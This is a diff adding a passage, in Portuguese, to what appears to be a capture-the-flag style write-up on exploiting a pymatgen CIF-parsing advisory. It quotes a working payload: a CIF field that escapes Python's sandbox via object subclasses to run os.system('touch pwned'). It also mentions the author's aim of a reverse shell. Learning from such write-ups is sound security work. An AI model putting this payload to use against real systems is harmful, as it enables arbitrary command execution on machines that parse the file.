@@ -43,5 +43,19 @@ https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-
 
 depois de um bom tempo de pesquisa, vou tentar montar meu exploit a partir do arquivo exemple.cif que encontramos lá e tentar explorar essa vuln
 
+Quando vejo que posso fazer um upload de arquivos, logo penso em reverse shell. Fui pesquisar sobre execução de comandos de sistema em python.
+
+Agora, voltando lá no arquivo que baixamos, contém o seguinte conteúdo:
+
+![image](https://github.com/user-attachments/assets/4c1f7acd-890e-4ab8-85c7-722c32e5adb0)
+
+De acordo com minha pesquisa, essa é a parte do exploit que executa comando:
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
+
+vou tentar adaptar o arquivo exemple.cif e transformá-lo em um exploit.
+
+
+
 
 
